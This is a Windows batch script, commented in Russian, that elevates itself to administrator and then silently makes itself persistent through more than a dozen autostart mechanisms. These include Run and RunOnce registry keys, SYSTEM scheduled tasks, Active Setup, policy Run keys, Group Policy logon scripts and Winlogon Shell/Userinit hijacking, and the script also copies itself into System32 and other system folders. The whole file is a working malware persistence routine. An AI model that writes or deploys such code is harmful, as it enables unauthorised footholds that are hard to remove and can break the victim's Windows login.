@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: Запуск от имени администратора
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Запрос прав администратора...
    powershell start-process -verb runas "%0"
    exit /b
)

:: Получаем информацию о текущем файле
set "SCRIPT_PATH=%~f0"
set "SCRIPT_NAME=%~n0"
set "SCRIPT_DIR=%~dp0"
set "SCRIPT_EXT=%~x0"
set "DATE_NOW=%DATE:~10,4%%DATE:~4,2%%DATE:~7,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
set "DATE_NOW=%DATE_NOW: =0%"

echo ================================================
echo   АВТОМАТИЧЕСКОЕ ДОБАВЛЕНИЕ В АВТОЗАГРУЗКУ
echo   ВСЕ 8 МЕТОДОВ БЕЗ ПОДТВЕРЖДЕНИЯ
echo ================================================
echo.
echo Файл: %SCRIPT_NAME%%SCRIPT_EXT%
echo Путь: %SCRIPT_PATH%
echo.
echo [1/8] Добавление в папку автозагрузки...
call :Method_StartupFolder

echo [2/8] Добавление в реестр HKCU...
call :Method_RegistryHKCU

echo [3/8] Добавление в реестр HKLM...
call :Method_RegistryHKLM

echo [4/8] Добавление в планировщик задач (логин)...
call :Method_SchedulerLogon

echo [5/8] Добавление в планировщик задач (задержка)...
call :Method_SchedulerDelay

echo [6/8] Добавление в Shell Startup папку...
call :Method_ShellStartup

echo [7/8] Добавление в WOW6432Node...
call :Method_WOW6432Node

echo [8/8] Добавление в Active Setup (МАКСИМАЛЬНАЯ МОЩЬ)...
call :Method_ActiveSetup

echo.
echo ================ КОПИРОВАНИЕ ФАЙЛА ================
call :Method_CopyFiles

echo.
echo ================ ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ ================
call :Method_AdditionalRegistry
call :Method_PolicyStartup
call :Method_Winlogon

echo.
echo ================================================
echo   ВСЕ МЕТОДЫ АВТОЗАГРУЗКИ УСПЕШНО АКТИВИРОВАНЫ!
echo   Файл запустится при следующем входе в систему
echo ================================================
echo.
echo Нажмите любую клавишу для проверки...
pause >nul

:: Показываем результат
cls
echo ================ ПРОВЕРКА АВТОЗАГРУЗКИ ================
echo.
echo РЕЕСТР HKCU:
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%SCRIPT_NAME%_power" 2>nul || echo   Не найдено
echo.
echo РЕЕСТР HKLM:
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%SCRIPT_NAME%_power" 2>nul || echo   Не найдено
echo.
echo ЗАДАЧИ ПЛАНИРОВЩИКА:
schtasks /query /tn "%SCRIPT_NAME%_PowerStart" 2>nul | find "%SCRIPT_NAME%" || echo   Не найдено
echo.
echo ПАПКА АВТОЗАГРУЗКИ:
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%SCRIPT_NAME%.lnk" 2>nul || echo   Не найдено
echo.
pause
exit /b

:: ================ МЕТОДЫ АВТОЗАГРУЗКИ ================

:Method_StartupFolder
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_SCRIPT=%TEMP%\startup_%RANDOM%.vbs"
(
echo Set oWS = WScript.CreateObject^("WScript.Shell"^)
echo sLinkFile = "%STARTUP_DIR%\%SCRIPT_NAME%_power.lnk"
echo Set oLink = oWS.CreateShortcut^(sLinkFile^)
echo oLink.TargetPath = "%SCRIPT_PATH%"
echo oLink.WorkingDirectory = "%SCRIPT_DIR%"
echo oLink.Description = "Power AutoStart - %SCRIPT_NAME%"
echo oLink.Save
) > "%VBS_SCRIPT%"
cscript /nologo "%VBS_SCRIPT%" >nul
del "%VBS_SCRIPT%"
exit /b

:Method_RegistryHKCU
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%SCRIPT_NAME%_power" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "%SCRIPT_NAME%_power" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v "%SCRIPT_NAME%_power" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
exit /b

:Method_RegistryHKLM
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%SCRIPT_NAME%_power" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "%SCRIPT_NAME%_power" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices" /v "%SCRIPT_NAME%_power" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
exit /b

:Method_SchedulerLogon
schtasks /create /tn "%SCRIPT_NAME%_PowerStart" /tr "%SCRIPT_PATH%" /sc onlogon /ru %USERNAME% /f >nul 2>nul
schtasks /create /tn "%SCRIPT_NAME%_PowerStart_System" /tr "%SCRIPT_PATH%" /sc onlogon /ru "SYSTEM" /f >nul 2>nul
exit /b

:Method_SchedulerDelay
schtasks /create /tn "%SCRIPT_NAME%_PowerDelay" /tr "%SCRIPT_PATH%" /sc onlogon /ru %USERNAME% /delay 0000:10 /f >nul 2>nul
schtasks /create /tn "%SCRIPT_NAME%_PowerStartup" /tr "%SCRIPT_PATH%" /sc onstartup /ru %USERNAME% /f >nul 2>nul
exit /b

:Method_ShellStartup
set "SHELL_STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\power"
if not exist "%SHELL_STARTUP%" mkdir "%SHELL_STARTUP%"
copy /y "%SCRIPT_PATH%" "%SHELL_STARTUP%\%SCRIPT_NAME%_copy1%SCRIPT_EXT%" >nul
copy /y "%SCRIPT_PATH%" "%SHELL_STARTUP%\%SCRIPT_NAME%_copy2%SCRIPT_EXT%" >nul
copy /y "%SCRIPT_PATH%" "%SHELL_STARTUP%\%SCRIPT_NAME%_copy3%SCRIPT_EXT%" >nul
exit /b

:Method_WOW6432Node
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v "%SCRIPT_NAME%_wow" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
reg add "HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" /v "%SCRIPT_NAME%_wow" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v "%SCRIPT_NAME%_wow" /t REG_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
exit /b

:Method_ActiveSetup
set "GUID_ACTIVE={%RANDOM%%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%%RANDOM%%RANDOM%}"
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%GUID_ACTIVE%" /v StubPath /t REG_EXPAND_SZ /d "\"%SCRIPT_PATH%\"" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%GUID_ACTIVE%" /v Version /t REG_SZ /d "1,0,0,0" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%GUID_ACTIVE%" /v Locale /t REG_SZ /d "ru" /f >nul 2>nul
exit /b

:Method_CopyFiles
:: Копируем в системные папки для надежности
set "COPY_LOCATIONS[0]=%WINDIR%\System32"
set "COPY_LOCATIONS[1]=%WINDIR%\SysWOW64"
set "COPY_LOCATIONS[2]=%WINDIR%"
set "COPY_LOCATIONS[3]=%TEMP%"
set "COPY_LOCATIONS[4]=%APPDATA%\Microsoft\Windows"

for /l %%i in (0,1,4) do (
    if exist "!COPY_LOCATIONS[%%i]!\" (
        copy /y "%SCRIPT_PATH%" "!COPY_LOCATIONS[%%i]!\%SCRIPT_NAME%_system%SCRIPT_EXT%" >nul 2>nul
    )
)
exit /b

:Method_AdditionalRegistry
:: Дополнительные скрытые места в реестре
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "%SCRIPT_NAME%" /t REG_SZ /d "%SCRIPT_PATH%" /f >nul 2>nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "%SCRIPT_NAME%" /t REG_SZ /d "%SCRIPT_PATH%" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx" /v "%SCRIPT_NAME%" /t REG_SZ /d "%SCRIPT_PATH%" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v "%SCRIPT_NAME%" /t REG_SZ /d "%SCRIPT_PATH%" /f >nul 2>nul
exit /b

:Method_PolicyStartup
:: Добавление через групповые политики
set "POLICY_PATH=%WINDIR%\System32\GroupPolicy\User\Scripts\Logon"
if not exist "%POLICY_PATH%" mkdir "%POLICY_PATH%" 2>nul
copy /y "%SCRIPT_PATH%" "%POLICY_PATH%\%SCRIPT_NAME%.bat" >nul 2>nul
exit /b

:Method_Winlogon
:: Winlogon Shell (критический метод)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, %SCRIPT_PATH%" /f >nul 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "userinit.exe, %SCRIPT_PATH%" /f >nul 2>nul
exit /b






